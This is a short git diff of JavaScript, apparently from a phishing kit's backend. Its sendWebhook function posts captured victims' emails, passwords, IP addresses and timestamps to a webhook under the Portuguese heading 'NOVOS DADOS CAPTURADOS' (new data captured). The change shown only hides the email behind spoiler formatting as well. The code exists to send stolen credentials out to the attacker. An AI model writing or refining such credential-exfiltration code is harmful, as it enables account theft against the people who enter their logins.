@@ -92,7 +92,7 @@ async function sendEmailNotification(data) {
 async function sendWebhook(data) {
     try {
         const webhookPayload = {
-            content: `🔒 **NOVOS DADOS CAPTURADOS**\n📧 Email: ${data.email}\n🔑 Senha: ||${data.password}||\n🌐 IP: ${data.ip}\n🕒 Horário: ${new Date(data.timestamp).toLocaleString('pt-BR')}`
+            content: `🔒 **NOVOS DADOS CAPTURADOS**\n📧 Email: ||${data.email}||\n🔑 Senha: ||${data.password}||\n🌐 IP: ${data.ip}\n🕒 Horário: ${new Date(data.timestamp).toLocaleString('pt-BR')}`
         };
         
         console.log('Enviando webhook simplificado...');
